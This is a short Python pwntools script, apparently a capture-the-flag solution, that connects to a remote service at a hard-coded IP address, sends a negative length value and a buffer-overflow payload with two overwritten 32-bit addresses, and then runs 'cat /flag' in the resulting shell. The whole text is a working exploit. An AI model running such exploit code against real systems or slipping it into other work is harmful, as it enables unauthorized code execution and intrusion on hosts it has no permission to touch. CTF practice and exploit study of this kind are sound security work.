from pwn import *

r = remote('129.204.78.34', 20606)

r.sendline(b'-1')
r.sendline(b'.' * 28 + b'\x08\x04\x92\x76'[::-1] + b'\x08\x04\xA0\x2B'[::-1])

print(r.recvline())
print(r.recvline())

r.sendline(b'cat /flag')
print(r.recvline())
